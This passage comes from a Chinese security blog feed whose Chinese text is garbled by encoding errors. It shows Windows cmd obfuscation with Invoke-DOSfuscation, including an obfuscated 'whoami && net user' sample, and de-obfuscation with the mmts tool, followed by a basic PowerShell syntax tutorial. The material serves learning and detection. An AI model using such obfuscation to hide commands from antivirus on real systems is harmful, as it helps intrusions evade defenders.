åˆ†æˆ3éƒ¨åˆ† .cmd cmd file</span><br><span class="line">tokens&#x3D;2  ä¼šé€‰æ‹©ç¬¬äºŒéƒ¨åˆ† å³cmd </span><br><span class="line">æ‰€ä»¥è¯¥å‘½ä»¤æ‰§è¡Œåä¼šå»è°ƒç”¨cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FOR &#x2F;F &quot;usebackq delims&#x3D;&#x3D;&quot; %i IN (&#96;set&#96;) DO @echo %i</span><br><span class="line">ä¼šæšä¸¾å½“å‰ç¯å¢ƒä¸­çš„ç¯å¢ƒå˜é‡åç§°</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<br>

<h3 id="åˆ©ç”¨æ··æ·†å·¥å…·"><a href="#åˆ©ç”¨æ··æ·†å·¥å…·" class="headerlink" title="åˆ©ç”¨æ··æ·†å·¥å…·"></a>åˆ©ç”¨æ··æ·†å·¥å…·</h3><p><a href="https://github.com/danielbohannon/Invoke-DOSfuscation">https://github.com/danielbohannon/Invoke-DOSfuscation</a></p>
<p>éœ€è¦powershellç®¡ç†å‘˜æƒé™ä¸‹å»è¿è¡Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-ExecutionPolicy Unrestricted</span><br><span class="line">Import-Module .\Invoke-DOSfuscation.psd1</span><br><span class="line">Invoke-DOSfuscation</span><br></pre></td></tr></table></figure>

<ul>
<li>ä½¿ç”¨<code>tutorial</code> æŸ¥çœ‹åŸºæœ¬ä½¿ç”¨æ–¹æ³•</li>
</ul>
<p><img src="/posts/bac18dc8/11.png" alt="æˆªå›¾"></p>
<ul>
<li>Set command [éœ€è¦æ··æ·†çš„å‘½ä»¤]  //è®¾ç½®éœ€è¦æ··æ·†çš„å‘½ä»¤   </li>
</ul>
<p><img src="/posts/bac18dc8/12.png" alt="æˆªå›¾"></p>
<ul>
<li>Set FINALBINARY [å‘½ä»¤è¿è¡Œçš„ç¯å¢ƒ]  //è®¾ç½®å‘½ä»¤è¿è¡Œçš„ç¯å¢ƒ</li>
</ul>
<p><img src="/posts/bac18dc8/13.png" alt="æˆªå›¾"></p>
<ul>
<li>payload  //åŠ è½½æ··æ·†æ¨¡å—</li>
</ul>
<p><img src="/posts/bac18dc8/14.png" alt="æˆªå›¾"></p>
<ul>
<li><p>show //æŸ¥çœ‹å½“å‰å‘½ä»¤è®¾ç½®çš„å‚æ•°è¯¦æƒ…</p>
<p><img src="/posts/bac18dc8/15.png"></p>
</li>
<li><p>test  //æµ‹è¯•æ··æ·†åçš„å‘½ä»¤</p>
</li>
</ul>
<br>

<h3 id="cmdå‘½ä»¤å»æ··æ·†"><a href="#cmdå‘½ä»¤å»æ··æ·†" class="headerlink" title="cmdå‘½ä»¤å»æ··æ·†"></a>cmdå‘½ä»¤å»æ··æ·†</h3><h4 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h4><ul>
<li>æ›¿æ¢æ‰ ^ è½¬ä¹‰å­—ç¬¦</li>
<li>é€šè¿‡ = å’Œ % çš„è§„åˆ™å»æŸ¥æ‰¾æ··æ·†çš„å˜é‡</li>
<li>é€šè¿‡ set æŸ¥æ‰¾æ··æ·†å˜é‡</li>
<li>é€šè¿‡ %:~m,n% æŸ¥æ‰¾æ··æ·†å˜é‡</li>
<li>ç»Ÿä¸€å°å†™å¸¸ç”¨å‘½ä»¤å’Œç¨‹åºåç§°</li>
</ul>
<h4 id="mmts"><a href="#mmts" class="headerlink" title="mmts"></a>mmts</h4><p>è¿™é‡Œä½¿ç”¨mmtsç®€å•è¯•ä¸€ä¸‹ é¡¹ç›®åœ°å€ <a href="https://github.com/a232319779/mmts">https://github.com/a232319779/mmts</a></p>
<p>å…ˆé€šè¿‡åæ··æ·†å·¥å…·ç”Ÿæˆä¸€æ¡å‘½ä»¤ ä¿å­˜ä¸º1.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd &#x2F;C&quot;set zUG&#x3D;\System32\ ^^^| findstr calc\.exe&amp;&amp;set cF&#x3D;:&amp;&amp;set szG&#x3D;Windows&amp;&amp;set QK&#x3D;\&amp;&amp;set HhO&#x3D;dir&amp;&amp;set u6&#x3D; C&amp;&amp;call set uQ&#x3D;%HhO%%u6%%cF%%QK%%szG%%zUG%&amp;&amp;cmd &#x2F;C %uQ%&quot;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå†mmtsä¸‹ <code>mmts-decmd 1.txt</code></p>
<p><img src="/posts/bac18dc8/16.png" alt="æˆªå›¾"></p>
<p>å†å»ç”Ÿæˆä¸€ä¸ªå¤æ‚ç‚¹çš„æ··æ·† <code>whoami &amp;&amp; net user</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f^o^R  ;   ,    ;  ,  ;   ,   ,   &#x2F;^F   ;   ;  ;  ;  &quot;      tokens&#x3D;   +2       delims&#x3D;H0lFu&quot;  ;   ,   ;   ,  ;  ;    %^V  ;   ;  ,   ,    ,  ^In    ,    ;  ;  ;  (   ,  ,    ,   ,    ;    ;   ,   &#39;   ,  ;    ,  ,    ;    ,   ;  ^^f^^t^^Y^^P^^E  ;   ;  ;    ;   ^|    ;   ,   ;    ;  ^^f^^iN^^D   ;   ;    ,    ;    ;  ,  ,  &quot;Cm&quot;   ;  ,   ,  ,  ;    ,  &#39;  ,   ;  ,   ;   )  ;  ,   ;   ;   ,   ^D^o   ;   ;  ,    %^V,     ;   ;  ;  ;  ,  ,   ;  9k467c^&#x2F;^v^@^E^O^f^ ^ ^    ;  ;   ;    ;  kwp3a&#x2F;^r       &quot;  ;  ;    ,   ,  ,  (       ,      ,    ,     ,     ,       (     ,    (^S^e^t ^  ^ ^*^_;&#x3D;^~^R^-^j^z^ri^2^S^U^&amp;e_^y^6^a^&gt;^s^aY^6vh^u^Z^d^L^+N^ ^#^k^6&#96;Ut^p ^4^c^H^e^,^jo^Y&#125;n^-^&#96;^5^9^_^ ^1^Z^)^, ^&amp;^]^2^;^e^t^^?^eO^&amp;^#^&amp;^,^K^Y^BN^^3%^D^I^w^ 1^l^H^3P^i~^f^b%;^m^(^f^o^@^)a^g^&#123;^c^s^K^o^_C^&#123;^E^&#96;^h^p^F^@^BAwp^Qd^B^?^ ^x^qs^zl^ ^Vq^&gt;^Y^j^|^f^&#123;^5S^Z^^O^)^6^?^\^ ^6^&lt;%^v^2\a^?^j^z^G^2^&amp;^W^S^9^a^3^&#96;^*^&gt;v^w^mj~#^t^(^ea^T^h^_^6^t^aB^)^A^X^s^j^b^D^(^W^y^\^Al^:&#123;^s^C^b^\5^@^\^M^C^XN^?^s^J^M^P^[^x^w^S^4^UCy^o^I^9^&#123;^2^S^d^T^w^_^&#96;^Xn^u^J^|r3^i~^x^&#123;^L^&amp;^w^[^r^vW^,^\^7^b^;^e^R^:^#^&#96;&#x3D;E^;^C^9^g^O^o~^ ^Z^v^&gt;^ ^A^r^Y^&#39;^m^$^[^iZ^&#x3D;^Bt^*^d) ; ; ; ; ) ; ; ; ; ; )&amp;       ;  ,    ;  ,   ,    ,  ;  ^f^o^R   ;   ;    ;    ;  ;  &#x2F;^L   ,  ,   ;    %^j  ;   ,  ,    ^In    ;    ,   ;  ,  (^  ^ ^ ^ ^2^9^3^   ^ ^ ^,^ ^ ^ ^;^ ^ ^ ^ , ^    ^ ^ ^;^ ^  ^,^ ^ ^ ^   ^ ; ^ ^ ^ ^ ^  ^,^   ^ ^ ^-^6 ^ ^   ^ ^ ^,^    ^+5^ ^ ^ ^ ^ ^ )   ,    ;    ;  ;   ,   ;  ;    ^D^o  ;   ,  ,    ;   ;    ,  ,    (       ,       (      ,    ;     ,       ;     ,      ;      ,      ;      ,    (      ,      (       ,     ;    ,     ;   ,   ;       ,     ;   ,     ;      ,    ;       ,     ;   ,       (     ,       ,   ,   ,    ,      ,   ,   (    ;   ,    ;  ,  ;    ;   ^S^Et        &#96;^&#123;^&#39;&#x3D;!&#96;^&#123;^&#39;!!^*^_;:~   %^j,      1!)       ,       ;     ,     ;       ,      ;     ,    ;    ,     )   ,     ,       ,     )       ,    ,   ,     ,       ,      ,       ,    )       ,     ;       ,     ;       ,      ;    ,    ;      ,      ;      ,     ;       ,       ;       ,     )     ,   ,   ,    ,      ,    )&amp;&amp;   ;    ;   ;  ,  ;    ^i^F  ,   ,    ,   ;    %^j  ;  ;    ;   ,    ^E^q^u   ,  ;  ;    ,   ^5   ,  ,    ;  (     ,     ,      ,     (     ,       ,    ,      (       ,   ;    ,      ;      ,       ;     ,       ;   ,   ;   ,      (   ,   ;    ,       ;       ,      ;       ,     ;       ,    (^e^C^h^O   ;   ,   ;    ;  !&#96;^&#123;^&#39;:^*^&#96;^&#123;&#39;!^&#x3D;!       |  ,  ,    ,   ;  ^F^O^r   ;   ,  ,   ;    &#x2F;^f   ;    ,    ;    &quot;^ ^ ^ ^ ^ ^ ^ t^ok^en^s&#x3D; ^ ^ ^ ^ ^ ^ ^+^2^ ^ ^ ^ ^de^li^m^s^&#x3D;^M^Hc^L^F^e&quot;   ,  ,    ,   ;   ,   %^D    ;   ,   ,   ^iN  ;   ;  ,    ;   ;    ;   ;   (    ,  ,   ,   ,   ,  ,   &#39;  ,   ,   ;   ,    ,   ,    ;    f^^^^T^^^^y^^^^Pe   ,   ;    ,   ;   ;   ,   ,  ^^^|  ,  ;  ,   ;   ,  ,   ^^^^F^^^^In^^^^D  ;   ,  ;    ;  &quot;Cm&quot;  ;   ,  ,   ;   ,  &#39;  ;  ,    ;    ;    ;   ,  )   ;   ;   ;    ^d^o    ,  ;  ;  %^D, )    ,      ,    )      ,    ,    )    ;     ;       ;    ;       ;   )      )   ;  ,  ;    ;    ;  ;    ;  &quot;</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯ä½¿ç”¨reverse çš„é«˜çº§æ··æ·†ï¼Œä½†æ˜¯mmtsä¹Ÿæ²¡ç”¨æŠŠä»–å½»åº•è§£å‡ºæ¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R  ;   ,    ;  ,  ;   ,   ,   &#x2F;F   ;   ;  ;  ;  &quot;      tokens&#x3D;   +2       delims&#x3D;H0lFu&quot;  ;   ,   ;   ,  ;  ;    %V  ;   ;  ,   ,    ,  In    ,    ;  ;  ;  (   ,  ,    ,   ,    ;    ;   ,   &#39;   ,  ;    ,  ,    ;    ,   ;  ftYPE  ;   ;  ;    ;   |    ;   ,   ;    ;  fiND   ;   ;    ,    ;    ;  ,  ,  &quot;Cm&quot;   ;  ,   ,  ,  ;    ,  &#39;  ,   ;  ,   ;   )  ;  ,   ;   ;   ,   Do   ;   ;  ,    %V,     ;   ;  ;  ;  ,  ,   ;  9k467c&#x2F;v@EOf      ;  ;   ;    ;  kwp3a&#x2F;r       &quot;  ;  ;    ,   ,  ,  (       ,      ,    ,     ,     ,       (     ,    (e_y6a&gt;saY6vhuZdL+N #k6&#96;Utp 4cHe,joY&#125;n-&#96;59_ 1Z), &amp;]2;et?eO&amp;#&amp;,KYBN3%DIw 1lH3Pi~fb%;m(fo@)ag&#123;csKo_C&#123;E&#96;hpF@BAwpQdB? xqszl Vq&gt;Yj|f&#123;5SZO)6?\ 6&lt;%v2\a?jzG2&amp;WS9a3&#96;*&gt;vwmj~#t(eaTh_6taB)AXsjbD(Wy\Al:&#123;sCb\5@\MCXN?sJMP[xwS4UCyoI9&#123;2SdTw_&#96;XnuJ|r3i~x&#123;L&amp;w[rvW,\7b;eR:#&#96;&#x3D;E;C9gOo~ Zv&gt; ArY&#39;m$[iZ&#x3D;Bt*d) ; ; ; ; ) ; ; ; ; ; )&amp;       ;  ,    ;  ,   ,    ,  ;  foR   ;   ;    ;    ;  ;  &#x2F;L   ,  ,   ;    %j  ;   ,  ,    In    ;    ,   ;  ,  (     293     ,   ;    ,       ;   ,       ;       ,     -6       ,    +5      )   ,    ;    ;  ;   ,   ;  ;    Do  ;   ,  ,    ;   ;    ,  ,    (       ,       (      ,    ;     ,       ;     ,      ;      ,      ;      ,    (      ,      (       ,     ;    ,     ;   ,   ;       ,     ;   ,     ;      ,    ;       ,     ;   ,       (     ,       ,   ,   ,    ,      ,   ,   (    ;   ,    ;  ,  ;    ;      ;    ;   ;  ,  ;    iF  ,   ,    ,   ;    %j  ;  ;    ;   ,    Equ   ,  ;  ;    ,   5   ,  ,    ;  (     ,     ,      ,     (     ,       ,    ,      (       ,   ;    ,      ;      ,       ;     ,       ;   ,   ;   ,      (   ,   ;    ,       ;       ,      ;       ,     ;       ,    (echo   ;   ,   ;    ;  !&#96;&#123;&#39;:*&#96;&#123;&#39;!&#x3D;!       |  ,  ,    ,   ;  FOr   ;   ,  ,   ;    &#x2F;f   ;    ,    ;    &quot;       tokens&#x3D;       +2    delims&#x3D;MHcLFe&quot;   ,  ,    ,   ;   ,   %D    ;   ,   ,   iN  ;   ;  ,    ;   ;    ;   ;   (    ,  ,   ,   ,   ,  ,   &#39;  ,   ,   ;   ,    ,   ,    ;    fTyPe   ,   ;    ,   ;   ;   ,   ,  |  ,  ;  ,   ;   ,  ,   FInD  ;   ,  ;    ;  &quot;Cm&quot;  ;   ,  ,   ;   ,  &#39;  ;  ,    ;    ;    ;   ,  )   ;   ;   ;    do    ,  ;  ;  %D, )    ,      ,    )      ,    ,    )    ;     ;       ;    ;       ;   )      )   ;  ,  ;    ;    ;  ;    ;  &quot;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bac18dc8/17.png" alt="æˆªå›¾"></p>
<p>å·¦ä¾§ä¸ºæ··æ·†åï¼Œå³ä¾§ä¸ºä½¿ç”¨mmtså»æ··æ·†åçš„ç»“æœ</p>
<p>ç›´æ¥ä½¿ç”¨psè„šæœ¬çš„ test åŠŸèƒ½ ç«ç»’éƒ½ä¼šæŠ¥é”™ï¼Œå¾ˆæ˜¾ç„¶å•å•è¿™ä¸€æŠ€æœ¯ç°åœ¨å·²ç»ä¸å¯è¡Œï¼Œè¿™é‡Œä¸»è¦æ˜¯å­¦ä¹ ä¸€ä¸‹æ€è·¯</p>
<p><img src="/posts/bac18dc8/18.png" alt="æˆªå›¾"></p>
<p><img src="/posts/bac18dc8/19.png" alt="æˆªå›¾"></p>
<br>



<p>è™½ç„¶ç°åœ¨æ¥è¯´å¯èƒ½æ²¡æ³•å»ç»•è¿‡æ€è½¯äº†ï¼ˆå¤§å¤šæ€è½¯éƒ½æ˜¯ä»åº•å±‚é˜²å¾¡ï¼‰ï¼Œä½†æ˜¯è¿˜ç®—æ˜¯ä¸€ç§æ€è·¯</p>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><blockquote>
<p><a href="https://www.anquanke.com/post/id/260422">https://www.anquanke.com/post/id/260422</a><br><a href="https://www.cnblogs.com/nongchaoer/p/13054822.html">https://www.cnblogs.com/nongchaoer/p/13054822.html</a><br><a href="https://www.t00ls.cc/articles-54517.html">https://www.t00ls.cc/articles-54517.html</a><br><a href="https://cloud.tencent.com/developer/article/1633973">https://cloud.tencent.com/developer/article/1633973</a><br><a href="https://ddvvmmzz.github.io/Windows-CMD%E5%91%BD%E4%BB%A4%E5%8E%BB%E6%B7%B7%E6%B7%86">https://ddvvmmzz.github.io/Windows-CMD%E5%91%BD%E4%BB%A4%E5%8E%BB%E6%B7%B7%E6%B7%86</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>spring_RCE_CVE-2022-22947å¤ç°</title>
    <url>/posts/178b79d4/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>DllåŠ«æŒå­¦ä¹ -01</title>
    <url>/posts/e1659c9c/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>PowershellåŸºç¡€å­¦ä¹ </title>
    <url>/posts/359bf983/</url>
    <content><![CDATA[<h3 id="PowershellåŸºç¡€"><a href="#PowershellåŸºç¡€" class="headerlink" title="PowershellåŸºç¡€"></a>PowershellåŸºç¡€</h3><h4 id="0x00-æ‰§è¡Œç­–ç•¥-amp-ç‰ˆæœ¬ä¿¡æ¯"><a href="#0x00-æ‰§è¡Œç­–ç•¥-amp-ç‰ˆæœ¬ä¿¡æ¯" class="headerlink" title="0x00 æ‰§è¡Œç­–ç•¥&amp; ç‰ˆæœ¬ä¿¡æ¯"></a>0x00 æ‰§è¡Œç­–ç•¥&amp; ç‰ˆæœ¬ä¿¡æ¯</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ExecutionPolicy</span></span><br><span class="line"><span class="built_in">Set-ExecutionPolicy</span></span><br><span class="line"></span><br><span class="line">Restrictedï¼šè„šæœ¬ä¸èƒ½è¿è¡Œ</span><br><span class="line">RemoteSignedï¼šåœ¨æœ¬åœ°åˆ›å»ºçš„è„šæœ¬å¯ä»¥è¿è¡Œï¼Œä½†ä»ç½‘ä¸Šä¸‹è½½çš„è„šæœ¬ä¸èƒ½è¿è¡Œï¼ˆæ‹¥æœ‰æ•°å­—è¯ä¹¦ç­¾åçš„é™¤å¤–ï¼‰ã€‚</span><br><span class="line">AllSignedï¼šä»…å½“å‰è„šæœ¬å—ä¿¡ä»»çš„å‘å¸ƒè€…ç­¾åæ—¶æ‰èƒ½è¿è¡Œã€‚</span><br><span class="line">Unrestrictedï¼šå…è®¸æ‰€æœ‰è„šæœ¬è¿è¡Œ</span><br></pre></td></tr></table></figure>

<ul>
<li>1.0 - windows server 2008</li>
<li>2.0 - windows server 2008 r2ã€windows 7</li>
<li>3.0 - windows server 2012ã€windows 8</li>
<li>4.0 - windows server 2012 r2ã€windows 8.1</li>
<li>5.0 - windows 10</li>
<li>5.1 - windows server 2016</li>
</ul>
<br>

<h4 id="0x01-åŸºæœ¬è¯­æ³•"><a href="#0x01-åŸºæœ¬è¯­æ³•" class="headerlink" title="0x01 åŸºæœ¬è¯­æ³•"></a>0x01 åŸºæœ¬è¯­æ³•</h4><ul>
<li>å¯¹ç¼©è¿›ä¸æ•æ„Ÿ</li>
<li>ä¸å¼ºåˆ¶åˆ†å·</li>
<li>ä¿ç•™å­—ã€å‘½ä»¤å¤§å°å†™åŒºåˆ†</li>
<li>ä»¥{}ä½œä¸ºä»£ç å—</li>
</ul>
<h4 id="0x02-å˜é‡"><a href="#0x02-å˜é‡" class="headerlink" title="0x02.å˜é‡"></a>0x02.å˜é‡</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">1</span></span><br><span class="line"><span class="comment"># å…¨å±€å˜é‡</span></span><br><span class="line"><span class="variable">$global:a</span> = <span class="number">1</span></span><br><span class="line"><span class="comment"># è„šæœ¬å˜é‡</span></span><br><span class="line"><span class="variable">$script:a</span> = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºå˜é‡a</span></span><br><span class="line"><span class="built_in">Write-host</span> <span class="variable">$a</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$a</span></span><br><span class="line"><span class="comment"># åˆ é™¤å˜é‡</span></span><br><span class="line"><span class="built_in">clear-variable</span></span><br><span class="line"><span class="comment"># æŸ¥çœ‹açš„ç±»å‹</span></span><br><span class="line"><span class="variable">$a</span>.GetType()</span><br></pre></td></tr></table></figure>

<h4 id="0x03-å¯¹è±¡é›†åˆ"><a href="#0x03-å¯¹è±¡é›†åˆ" class="headerlink" title="0x03 å¯¹è±¡é›†åˆ"></a>0x03 å¯¹è±¡é›†åˆ</h4><h5 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># åˆ›å»ºå’Œåˆå§‹åŒ–æ•°ç»„</span><br><span class="line">$arr &#x3D; 1,2,3,4,5</span><br><span class="line">$arr2 &#x3D; 1..5</span><br><span class="line"></span><br><span class="line">$arr[0]</span><br><span class="line">$arr2[2..5]</span><br><span class="line"></span><br><span class="line"># æ•°ç»„å¤§å°</span><br><span class="line">$arr.Length</span><br><span class="line"></span><br><span class="line">#æ•°ç»„æ“ä½œ</span><br><span class="line">$arr[2] &#x3D; 8</span><br><span class="line"># å°†å…ƒç´ æ·»åŠ åˆ°$arrä¸­ </span><br><span class="line">$arr +&#x3D; 6</span><br><span class="line"></span><br><span class="line"># åˆå§‹åŒ–ä¸€ä¸ªç©ºæ•°ç»„</span><br><span class="line">$arr &#x3D; @()</span><br><span class="line"></span><br><span class="line"># ä»æ•°ç»„ä¸­åˆ é™¤å…ƒç´ </span><br><span class="line">$arr &#x3D; 1..5</span><br><span class="line">$arr &#x3D; ($arr[1], $arr[2], $arr[3])</span><br></pre></td></tr></table></figure>

<br>

<h5 id="å­—å…¸"><a href="#å­—å…¸" class="headerlink" title="å­—å…¸"></a>å­—å…¸</h5><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$dict</span> = <span class="selector-tag">@</span>&#123;&lt;key1&gt; = &lt;value1&gt; ; &lt; key2&gt; = &lt;value2&gt; ; ..... ; &lt; keyN&gt; = &lt;valueN&gt;;&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dict</span> = <span class="selector-tag">@</span>&#123;a = <span class="number">1</span>; a2 = <span class="number">2</span> ;&#125;</span><br><span class="line"><span class="variable">$dict</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Name                           Value                                                                      </span></span><br><span class="line"><span class="comment"># ----                           -----                                                                      </span></span><br><span class="line"><span class="comment"># a                              1                                                                          </span></span><br><span class="line"><span class="comment"># a2                             2   </span></span><br><span class="line"></span><br><span class="line"><span class="variable">$dict</span>.Keys</span><br><span class="line"><span class="comment"># a</span></span><br><span class="line"><span class="comment"># a2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$dict</span>.values</span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ˜¾ç¤ºå“ˆå¸Œè¡¨çš„é”®/å€¼å¯¹æ€»æ•°</span></span><br><span class="line"><span class="variable">$dict</span>.count</span><br><span class="line"></span><br><span class="line"><span class="variable">$dict</span>.</span><br><span class="line"><span class="variable">$dict</span>.Add(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="variable">$dict</span>.Remove(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$hash</span> = <span class="selector-tag">@</span>&#123; ID = <span class="number">1</span>; Shape = <span class="string">&quot;Square&quot;</span>; Color = <span class="string">&quot;Blue&quot;</span>&#125;</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Print all hashtable keys&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.keys</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Print all hashtable values&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.values</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Get ID&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>[<span class="string">&quot;ID&quot;</span>]</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Get Shape&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Number</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;print Size&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Count</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Add key-value&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>[<span class="string">&quot;Updated&quot;</span>] = <span class="string">&quot;Now&quot;</span></span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Add key-value&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Add(<span class="string">&quot;Created&quot;</span>,<span class="string">&quot;Now&quot;</span>)</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;print Size&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Count</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;Remove key-value&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Remove(<span class="string">&quot;Updated&quot;</span>)</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;print Size&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.Count</span><br><span class="line"><span class="built_in">write-host</span>(<span class="string">&quot;sort by key&quot;</span>)</span><br><span class="line"><span class="variable">$hash</span>.GetEnumerator() | <span class="built_in">Sort-Object</span> <span class="literal">-Property</span> key</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">Print all hashtable keys</span><br><span class="line">Color</span><br><span class="line">Shape</span><br><span class="line">ID</span><br><span class="line">Print all hashtable values</span><br><span class="line">Blue</span><br><span class="line">Square</span><br><span class="line"><span class="number">1</span></span><br><span class="line">Get ID</span><br><span class="line"><span class="number">1</span></span><br><span class="line">Get Shape</span><br><span class="line">print Size</span><br><span class="line"><span class="number">3</span></span><br><span class="line">Add key<span class="literal">-value</span></span><br><span class="line">Add key<span class="literal">-value</span></span><br><span class="line">print Size</span><br><span class="line"><span class="number">5</span></span><br><span class="line">Remove key<span class="literal">-value</span></span><br><span class="line">print Size</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="built_in">sort</span> by key</span><br><span class="line">Name Value</span><br><span class="line">---- -----</span><br><span class="line">Color Blue</span><br><span class="line">Created Now</span><br><span class="line">ID <span class="number">1</span></span><br><span class="line">Shape Square</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<h4 id="0x04-è¿ç®—ç¬¦"><a href="#0x04-è¿ç®—ç¬¦" class="headerlink" title="0x04  è¿ç®—ç¬¦"></a>0x04  è¿ç®—ç¬¦</h4><h5 id="æ¯”è¾ƒè¿ç®—ç¬¦"><a href="#æ¯”è¾ƒè¿ç®—ç¬¦" class="headerlink" title="æ¯”è¾ƒè¿ç®—ç¬¦"></a>æ¯”è¾ƒè¿ç®—ç¬¦</h5><ul>
<li>-eq        ç­‰äº</li>
<li>-ne        ä¸ç­‰äº</li>
<li>-gt        å¤§äº</li>
<li>-ge        å¤§äºç­‰äº</li>
<li>-lt        å°äº</li>
<li>-le        å°äºç­‰äº</li>
</ul>
<h5 id="åŒ¹é…è¿ç®—ç¬¦"><a href="#åŒ¹é…è¿ç®—ç¬¦" class="headerlink" title="åŒ¹é…è¿ç®—ç¬¦"></a>åŒ¹é…è¿ç®—ç¬¦</h5><ul>
<li>-like</li>
<li>-notlike</li>
<li>-match</li>
<li>-notmatch</li>
</ul>
<h5 id="åŒ…å«è¿ç®—ç¬¦"><a href="#åŒ…å«è¿ç®—ç¬¦" class="headerlink" title="åŒ…å«è¿ç®—ç¬¦"></a>åŒ…å«è¿ç®—ç¬¦</h5><ul>
<li>-contains</li>
<li>-nocontains</li>
<li>-match</li>
<li>-notmatch</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;abc&quot;</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;a*&quot;</span></span><br><span class="line"><span class="variable">$c</span> = <span class="string">&quot;a??&quot;</span></span><br><span class="line"><span class="variable">$a</span> <span class="operator">-like</span> <span class="variable">$b</span></span><br><span class="line"><span class="comment"># True</span></span><br><span class="line"><span class="variable">$a</span> <span class="operator">-like</span> <span class="variable">$c</span></span><br><span class="line"><span class="comment"># True</span></span><br><span class="line">----------------------</span><br><span class="line">----------------------</span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">1</span></span><br><span class="line"><span class="variable">$a</span> <span class="operator">-contains</span> <span class="variable">$b</span></span><br><span class="line"><span class="comment"># True</span></span><br><span class="line"><span class="variable">$b</span> <span class="operator">-contains</span> <span class="variable">$a</span></span><br><span class="line"><span class="comment"># False</span></span><br></pre></td></tr></table></figure>

<h4 id="0x05-æ§åˆ¶æµç¨‹"><a href="#0x05-æ§åˆ¶æµç¨‹" class="headerlink" title="0x05 æ§åˆ¶æµç¨‹"></a>0x05 æ§åˆ¶æµç¨‹</h4><h5 id="é€‰æ‹©"><a href="#é€‰æ‹©" class="headerlink" title="é€‰æ‹©"></a>é€‰æ‹©</h5><ul>
<li>if else</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">1</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> <span class="operator">-eq</span> <span class="variable">$b</span>)&#123;</span><br><span class="line">  <span class="built_in">write-host</span> <span class="string">&quot;aaa&quot;</span> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$a</span> <span class="operator">-gt</span> <span class="variable">$b</span>)&#123;</span><br><span class="line">  <span class="built_in">write-host</span> <span class="string">&quot;bbb&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="built_in">write-host</span> <span class="string">&quot;ccc&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># ccc</span></span><br></pre></td></tr></table></figure>

<ul>
<li>switch</li>
</ul>
